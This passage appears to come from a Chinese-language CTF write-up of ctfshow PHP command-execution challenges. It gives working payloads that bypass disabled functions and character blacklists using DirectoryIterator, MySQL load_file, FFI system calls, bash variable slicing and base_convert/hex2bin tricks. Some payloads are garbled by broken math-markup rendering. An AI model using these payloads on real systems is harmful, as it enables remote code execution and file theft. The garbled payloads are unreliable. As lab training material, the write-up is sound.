<span class="token function">ctfshow</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat /flag0.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ob_end_flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<h5><a id="web73_920"></a>web73</h5> 
<p>首先查找flag位置,然后使用文件包含得到flag</p> 
<p>Payload:</p> 
<blockquote> 
 <p>1、c=var_export(scandir(‘/’));exit(0);c=require_once(‘/flagc.txt’);exit(0);</p> 
 <p>2、c=?&gt;&lt;?php $a=new DirectoryIterator("glob://./*"); foreach($a as $f) { echo($f-&gt;__toString().' '); } exit(0); ?&gt;</p> 
 <p>c=include(‘flagc.txt’);exit(0);</p> 
</blockquote> 
<h5><a id="web74_938"></a>web74</h5> 
<p>scandir函数被ban了，使用DirectoryIterator类，flag在/flagx.txt</p> 
<p>或者使用glob协议</p> 
<p>Payload:</p> 
<blockquote> 
 <p>c=var_export(glob(‘…/…/…’.‘/*’));exit(0);</p> 
</blockquote> 
<h5><a id="web75Sql_load_file_950"></a>web75(Sql load_file)</h5> 
<p>可以查到flag位置：/flag36.txt 但是include被ban了，之前的poc因为strlen被禁了获取不到system地址也没法用了</p> 
<p>可以使用mysql的load_file函数</p> 
<p>先查询数据库</p> 
<pre><code class="prism language-php">c<span class="token operator">=</span><span class="token variable">$dsn</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"mysql:host=localhost;dbname=information_schema"</span><span class="token punctuation">;</span>
<span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token variable">$dsn</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'root'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$rs</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select database()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">## $rs = $db-&gt;query("select group_concat(SCHEMA_NAME) from SCHEMATA");</span>
<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$rs</span> <span class="token keyword">as</span> <span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"|"</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre> 
<p>查到了ctftraining的数据库，然后使用load_file读取flag</p> 
<blockquote> 
 <pre><code class="prism language-php">c<span class="token operator">=</span><span class="token keyword">try</span> <span class="token punctuation">{<!-- --></span><span class="token variable">$dbh</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'mysql:host=localhost;dbname=ctftraining'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'root'</span><span class="token punctuation">,</span>
<span class="token string single-quoted-string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$dbh</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'select load_file("/flag36.txt")'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$row</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"|"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token variable">$dbh</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">PDOException</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span><span class="token keyword">echo</span> <span class="token variable">$e</span><span class="token operator">-</span>
<span class="token operator">&gt;</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
</blockquote> 
<h5><a id="web76_978"></a>web76</h5> 
<p>Payload同上</p> 
<h5><a id="web77FFI_php74_982"></a>web77(FFI php7.4以上)</h5> 
<p>FFI，php7.4以上才有</p> 
<p>Payload:</p> 
<blockquote> 
 <p>$ffi = FFI::cdef(“int system(const char *command);”);//创建一个system对象<br> $a=‘/readflag &gt; 1.txt’; //没有回显，需要重定向到文件<br> <span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          f 
         
        
          f 
         
        
          i 
         
        
          − 
         
        
          &gt; 
         
        
          s 
         
        
          y 
         
        
          s 
         
        
          t 
         
        
          e 
         
        
          m 
         
        
          ( 
         
        
       
         ffi-&gt;system( 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.8889em; vertical-align: -0.1944em;"></span><span class="mord mathnormal" style="margin-right: 0.1076em;">ff</span><span class="mord mathnormal">i</span><span class="mord">−</span><span class="mspace" style="margin-right: 0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right: 0.2778em;"></span></span><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mord mathnormal">sys</span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mord mathnormal">m</span><span class="mopen">(</span></span></span></span></span>a); //通过$ffi去调用system函数</p> 
</blockquote> 
<h5><a id="web118Bash_992"></a>web118(Bash内置变量)</h5> 
<p>看到源码有提示</p> 
<pre><code class="prism language-php"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">--</span><span class="token operator">&gt;</span>
</code></pre> 
<p>但几乎常规输入都被ban了</p> 
<pre><code class="prism language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\x09|\x0a|[a-z]|[0-9]|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\'|\"|\`|\||\,/'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre> 
<p>经过fuzz爆破了一下可以正常使用的payload只有一些大写字母和符号，可以进行bash内置变量构造</p> 
<p><img src="https://images2.imgbox.com/21/33/LLXMMmug_o.png" alt="在这里插入图片描述"></p> 
<p>一般在Linux下环境变量<code>PATH</code>一般是<code>/bin</code>，题目路径<code>PWD</code>是<code>/var/www/html</code></p> 
<p>可以利用切片来得到我们需要的字母</p> 
<pre><code class="prism language-shell"><span class="token builtin class-name">echo</span> <span class="token variable">${<!-- --><span class="token environment constant">PWD</span>}</span> 
<span class="token builtin class-name">echo</span> <span class="token variable">${<!-- --><span class="token environment constant">PWD</span><span class="token operator">:</span>0<span class="token operator">:</span>1}</span>
<span class="token builtin class-name">echo</span> <span class="token variable">${<!-- --><span class="token environment constant">PWD</span><span class="token operator">:</span>0<span class="token operator">:</span>3}</span>
<span class="token builtin class-name">echo</span> <span class="token variable">${<!-- --><span class="token environment constant">PWD</span><span class="token operator">:</span>1<span class="token operator">:</span>1}</span>
<span class="token builtin class-name">echo</span> <span class="token variable">${<!-- --><span class="token environment constant">PWD</span><span class="token operator">:</span>2<span class="token operator">:</span>3}</span>

<span class="token builtin class-name">echo</span> <span class="token variable">${<!-- --><span class="token environment constant">PWD</span><span class="token operator">:</span>~0<span class="token operator">:</span>1}</span>          //从末尾开始取一个

</code></pre> 
<p>但是题目过滤了数字，无法使用切片。换一种方式获取字符。</p> 
<p>linux可以利用<code>~</code>获得变量的最后几位（从最后开始获取），使用取反号时，任何字母等同于数字0。</p> 
<pre><code class="prism language-shell"><span class="token builtin class-name">echo</span> <span class="token variable">${<!-- --><span class="token environment constant">PWD</span>}</span>
<span class="token builtin class-name">echo</span> <span class="token variable">${<!-- --><span class="token environment constant">PWD</span><span class="token operator">:</span>~0}</span>
<span class="token builtin class-name">echo</span> <span class="token variable">${<!-- --><span class="token environment constant">PWD</span><span class="token operator">:</span>~1}</span>
<span class="token builtin class-name">echo</span> <span class="token variable">${<!-- --><span class="token environment constant">PWD</span><span class="token operator">:</span>~2}</span>
<span class="token builtin class-name">echo</span> <span class="token variable">${<!-- --><span class="token environment constant">PWD</span><span class="token operator">:</span>~j}</span>
<span class="token builtin class-name">echo</span> <span class="token variable">${<!-- --><span class="token environment constant">PWD</span><span class="token operator">:</span>~J}</span>

</code></pre> 
<p>所以，<code>${PATH:~A}${PWD:~A}</code>表示的就是<code>PATH</code>的最后一个字母和<code>PWD</code>的最后一个字母，组合起来就是nl。</p> 
<p><code>flag.php</code>我们可以用通配符代替<code>????.???</code></p> 
<p>Payload:</p> 
<blockquote> 
 <p><span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          P 
         
        
          A 
         
        
          T 
         
        
          H 
         
        
          : 
         
        
            
         
        
          A 
         
        
       
         {PATH:~A} 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.6833em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right: 0.1389em;">P</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right: 0.1389em;">T</span><span class="mord mathnormal" style="margin-right: 0.0813em;">H</span><span class="mspace" style="margin-right: 0.2778em;"></span><span class="mrel">:</span><span class="mspace nobreak"> </span><span class="mspace" style="margin-right: 0.2778em;"></span><span class="mord mathnormal">A</span></span></span></span></span></span>{PWD:~A} ???.???</p> 
</blockquote> 
<h5><a id="web119_1049"></a>web119</h5> 
<p>过滤了PATH,所以想来拓展一下Bash变量</p> 
<pre><code class="prism language-shell"><span class="token variable">${<!-- --><span class="token environment constant">RANDOM</span>}</span>
随机的几个数

<span class="token variable">${<!-- --><span class="token environment constant">PWD</span>}</span>
/var/www/html

<span class="token variable">${<!-- --><span class="token environment constant">USER</span>}</span>
www-data

<span class="token variable">${<!-- --><span class="token environment constant">HOME</span>}</span>
当前用户的主目录

<span class="token variable">${<!-- --><span class="token environment constant">SHLVL</span>}</span>
是记录多个 Bash 进程实例嵌套深度的累加器,进程第一次打开shell时<span class="token variable">${<!-- --><span class="token environment constant">SHLVL</span>}</span><span class="token operator">=</span><span class="token number">1</span>，然后在此shell中再打开一个shell时<span class="token environment constant">$SHLVL</span><span class="token operator">=</span><span class="token number">2</span>。

<span class="token variable">${<!-- --><span class="token environment constant">RANDOM</span>}</span>
此变量值，随机出现整数，范围为0-32767。在Linux中，<span class="token variable">${<!-- --><span class="token operator">#</span>xxx}</span>显示的是这个值的位数不加<span class="token comment">#是变量的值，加了#是变量的值的长度。例如${#12345}的值是5，而random函数绝大部分产生的数字都是4位或者5位的，因此${#RANDOM}可以代替4或者5。</span>

<span class="token variable">${<!-- --><span class="token environment constant">IFS</span>}</span>
空格符、tab字符、换行字符<span class="token punctuation">(</span>newline<span class="token punctuation">)</span> 长度为3。<span class="token punctuation">{<!-- --></span>#<span class="token environment constant">IFS</span><span class="token punctuation">}</span><span class="token operator">=</span><span class="token number">3</span>

</code></pre> 
<p><img src="https://images2.imgbox.com/03/20/XEDZcVq1_o.png" alt="在这里插入图片描述"></p> 
<h5><a id="web120_1083"></a>web120</h5> 
<p>多ban了BASH和HOME，但影响不大</p> 
<p>Payload同上</p> 
<h5><a id="web121_1089"></a>web121</h5> 
<p><img src="https://images2.imgbox.com/5b/7f/DJi1NNhS_o.png" alt="在这里插入图片描述"></p> 
<h5><a id="_1093"></a></h5> 
<h5><a id="web122_1095"></a>web122</h5> 
<p><img src="https://images2.imgbox.com/c5/65/FBBxdzCV_o.png" alt="在这里插入图片描述"></p> 
<h5><a id="web124_1100"></a>web124</h5> 
<p>2019CISCN初赛原题</p> 
<pre><code class="prism language-php+HTML"> &lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: 收集自网络
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-06 14:04:45

*/

error_reporting(0);
//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET['c'])){
    show_source(__FILE__);
}else{
    //例子 c=20-1
    $content = $_GET['c'];
    if (strlen($content) &gt;= 80) {
        die("太长了不会算");
    }
    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $content)) {
            die("请不要输入奇奇怪怪的字符");
        }
    }
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die("请不要输入奇奇怪怪的函数");
        }
    }
    //帮你算出答案
    eval('echo '.$content.';');
} 
</code></pre> 
<p><strong>代码审计</strong></p> 
<p>代码接受GET传参<code>c</code>，保存在<code>content</code>中，并对参数长度进行了限制<code>&lt;80</code>。</p> 
<p>然后设置了一个黑名单，过滤了一些特殊字符，<code>空格</code>和<code>/</code>也给过滤了，所以<code>cat /flag</code>无门。</p> 
<p>接下来提供了一个白名单，里面是一些数学函数，并提供了一个常用数学函数的链接，可以查到这些函数的用法。</p> 
<p>都满足以上条件后，使用<code>eval</code>来执行传入的参数。</p> 
<p>分析到这里，只能利用白名单中提供的函数来构造命令，用到的函数有：</p> 
<ul><li><code>base_convert()</code>：在任意进制之间转换数字</li><li><code>dechex()</code>：将十进制转换成十六进制</li><li><code>hex2bin()</code>：将十六进制转换成ascii字符</li></ul> 
<p><strong>思路是：先利用<code>dechex()</code>将GET传入的十进制数转换成十六进制，再利用<code>hex2bin()</code>将得到的十六进制数转换成ascii字符串。又因为白名单里没有<code>hex2bin()</code>这个函数，所以需要利用<code>base_convert()</code>来将GET传入的十进制数转换成三十六进制（因为三十六进制中含有数字字母）构造出<code>hex2bin</code>，最后将分别传入的字符串拼接即可构造成功。</strong></p> 
<p>*Trick：十进制数<code>37907361743</code>转换成三十六进制之后正好就是<code>hex2bin</code>。</p> 
<p>因为代码中对传入的参数<code>c</code>做了长度限制，但可以通过传入其它参数，在构造出来的语句中调用即可。</p> 
<p>这里还涉及到一个知识点，PHP中可以将函数名保存在一个变量中，然后使用这个变量来替代函数名，例如：</p> 
<pre><code>$a = 'dechex';
echo $a(10);	// a
</code></pre> 
<p>利用以上知识点，尝试构造如下payload：</p> 
<pre><code>?c=$_GET[a]($_GET[b])&amp;a=system&amp;b=cat /flag
</code></pre> 
<p>构造过程如下：</p> 
<pre><code>base_convert(37907361743, 10, 36);		=&gt;		hex2bin
dechex(1598506324);						=&gt;		5f474554
hex2bin('5f474554');					=&gt;		_GET

($$pi){pi}(($$pi){abs}) 				=&gt; 		($_GET){pi}($_GET){abs}  //{}可以代替[]

综上：
$pi = base_convert(37907361743, 10, 36);
$pi = $pi(dechex(1598506324));
echo $pi;	// _GET，即此时的$pi就是_GET
</code></pre> 
<p>拼接形成payload：</p> 
<blockquote> 
 <p>?c=<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          p 
         
        
          i 
         
        
          = 
         
        
          b 
         
        
          a 
         
        
          s 
         
         
         
           e 
          
         
           c 
          
         
        
          o 
         
        
          n 
         
        
          v 
         
        
          e 
         
        
          r 
         
        
          t 
         
        
          ( 
         
        
          37907361743 
         
        
          , 
         
        
          10 
         
        
          , 
         
        
          36 
         
        
          ) 
         
        
          ( 
         
        
          d 
         
        
          e 
         
        
          c 
         
        
          h 
         
        
          e 
         
        
          x 
         
        
          ( 
         
        
          1598506324 
         
        
          ) 
         
        
          ) 
         
        
          ; 
         
        
          ( 
         
        
       
         pi=base_convert(37907361743,10,36)(dechex(1598506324));( 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.854em; vertical-align: -0.1944em;"></span><span class="mord mathnormal">p</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right: 0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.2778em;"></span></span><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mord mathnormal">ba</span><span class="mord mathnormal">s</span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.1514em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right: 0.0359em;">v</span><span class="mord mathnormal" style="margin-right: 0.0278em;">er</span><span class="mord mathnormal">t</span><span class="mopen">(</span><span class="mord">37907361743</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.1667em;"></span><span class="mord">10</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.1667em;"></span><span class="mord">36</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathnormal">d</span><span class="mord mathnormal">ec</span><span class="mord mathnormal">h</span><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span><span class="mopen">(</span><span class="mord">1598506324</span><span class="mclose">))</span><span class="mpunct">;</span><span class="mspace" style="margin-right: 0.1667em;"></span><span class="mopen">(</span></span></span></span></span><span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          p 
         
        
          i 
         
        
          ) 
         
         
         
           p 
          
         
           i 
          
         
        
          ( 
         
        
          ( 
         
        
       
         pi){pi}(( 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mord mathnormal">p</span><span class="mord mathnormal">i</span><span class="mclose">)</span><span class="mord"><span class="mord mathnormal">p</span><span class="mord mathnormal">i</span></span><span class="mopen">((</span></span></span></span></span>$pi){abs})&amp;pi=system&amp;abs=cat%20/flag</p> 
</blockquote> 
<blockquote> 
 <p>?c=<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          p 
         
        
          i 
         
        
          = 
         
        
          b 
         
        
          a 
         
        
          s 
         
         
         
           e 
          
         
           c 
          
         
        
          o 
         
        
          n 
         
        
          v 
         
        
          e 
         
        
          r 
         
        
          t 
         
        
          ( 
         
        
          37907361743 
         
        
          , 
         
        
          10 
         
        
          , 
         
        
          36 
         
        
          ) 
         
        
          ( 
         
        
          d 
         
        
          e 
         
        
          c 
         
        
          h 
         
        
          e 
         
        
          x 
         
        
          ( 
         
        
          1598506324 
         
        
          ) 
         
        
          ) 
         
        
          ; 
         
        
       
         pi=base_convert(37907361743,10,36)(dechex(1598506324)); 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.854em; vertical-align: -0.1944em;"></span><span class="mord mathnormal">p</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right: 0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.2778em;"></span></span><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mord mathnormal">ba</span><span class="mord mathnormal">s</span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.1514em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right: 0.0359em;">v</span><span class="mord mathnormal" style="margin-right: 0.0278em;">er</span><span class="mord mathnormal">t</span><span class="mopen">(</span><span class="mord">37907361743</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.1667em;"></span><span class="mord">10</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.1667em;"></span><span class="mord">36</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathnormal">d</span><span class="mord mathnormal">ec</span><span class="mord mathnormal">h</span><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span><span class="mopen">(</span><span class="mord">1598506324</span><span class="mclose">))</span><span class="mpunct">;</span></span></span></span></span><span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          p 
         
        
          i 
         
         
         
           p 
          
         
           i 
          
         
        
          ( 
         
        
       
         pi{pi}( 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mord mathnormal">p</span><span class="mord mathnormal">i</span><span class="mord"><span class="mord mathnormal">p</span><span class="mord mathnormal">i</span></span><span class="mopen">(</span></span></span></span></span>$pi{abs})&amp;pi=system&amp;abs=cat flag.php</p> 
 <p>?c=(<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          p 
         
        
          i 
         
        
          = 
         
        
          b 
         
        
          a 
         
        
          s 
         
         
         
           e 
          
         
           c 
          
         
        
          o 
         
        
          n 
         
        
          v 
         
        
          e 
         
        
          r 
         
        
          t 
         
        
          ) 
         
        
          ( 
         
        
          22950 
         
        
          , 
         
        
          23 
         
        
          , 
         
        
          34 
         
        
          ) 
         
        
          ( 
         
        
       
         pi=base_convert)(22950,23,34)( 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.854em; vertical-align: -0.1944em;"></span><span class="mord mathnormal">p</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right: 0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.2778em;"></span></span><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mord mathnormal">ba</span><span class="mord mathnormal">s</span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.1514em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right: 0.0359em;">v</span><span class="mord mathnormal" style="margin-right: 0.0278em;">er</span><span class="mord mathnormal">t</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord">22950</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.1667em;"></span><span class="mord">23</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.1667em;"></span><span class="mord">34</span><span class="mclose">)</span><span class="mopen">(</span></span></span></span></span>pi(76478043844,9,34)(dechex(109270211257898)))</p> 
 <p>?c=base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)<sup>asinh</sup>pi))</p> 
 <p>?c=<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          p 
         
        
          i 
         
        
          = 
         
        
          ( 
         
        
          i 
         
         
         
           s 
          
         
           n 
          
         
        
          a 
         
         
         
           n 
          
         
           ( 
          
         
        
          6 
         
        
          ) 
         
        
          . 
         
        
          ( 
         
        
          4 
         
        
          ) 
         
        
          ) 
         
        
          . 
         
        
          ( 
         
        
          t 
         
        
          a 
         
         
         
           n 
          
         
           ( 
          
         
        
          1 
         
        
          ) 
         
        
          . 
         
        
          ( 
         
        
          5 
         
        
          ) 
         
        
          ) 
         
        
          ; 
         
        
       
         pi=(is_nan^(6).(4)).(tan^(1).(5)); 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.854em; vertical-align: -0.1944em;"></span><span class="mord mathnormal">p</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right: 0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.2778em;"></span></span><span class="base"><span class="strut" style="height: 1.138em; vertical-align: -0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">i</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.1514em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mord mathnormal">a</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.888em;"><span class="" style="top: -3.063em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mopen mtight">(</span></span></span></span></span></span></span></span><span class="mord">6</span><span class="mclose">)</span><span class="mord">.</span><span class="mopen">(</span><span class="mord">4</span><span class="mclose">))</span><span class="mord">.</span><span class="mopen">(</span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.888em;"><span class="" style="top: -3.063em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mopen mtight">(</span></span></span></span></span></span></span></span><span class="mord">1</span><span class="mclose">)</span><span class="mord">.</span><span class="mopen">(</span><span class="mord">5</span><span class="mclose">))</span><span class="mpunct">;</span></span></span></span></span>pi=$<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          p 
         
        
          i 
         
        
          ; 
         
        
       
         pi; 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.854em; vertical-align: -0.1944em;"></span><span class="mord mathnormal">p</span><span class="mord mathnormal">i</span><span class="mpunct">;</span></span></span></span></span>pi{0}($pi{1})&amp;0=system&amp;1=cat%20flag.php</p> 
 <p><span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          p 
         
        
          i 
         
        
          = 
         
        
          b 
         
        
          a 
         
        
          s 
         
         
         
           e 
          
         
           c 
          
         
        
          o 
         
        
          n 
         
        
          v 
         
        
          e 
         
        
          r 
         
        
          t 
         
        
          , 
         
        
       
         pi=base_convert, 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.854em; vertical-align: -0.1944em;"></span><span class="mord mathnormal">p</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right: 0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.2778em;"></span></span><span class="base"><span class="strut" style="height: 0.8889em; vertical-align: -0.1944em;"></span><span class="mord mathnormal">ba</span><span class="mord mathnormal">s</span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.1514em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right: 0.0359em;">v</span><span class="mord mathnormal" style="margin-right: 0.0278em;">er</span><span class="mord mathnormal">t</span><span class="mpunct">,</span></span></span></span></span>pi(696468,10,36)($pi(8768397090111664438,10,30)(){1})<br> //要在请求头里面加一个 1:tac flag.php 见下图</p> 
</blockquote>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/8f85b14ca5fa046af1d24706e80cddd4/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
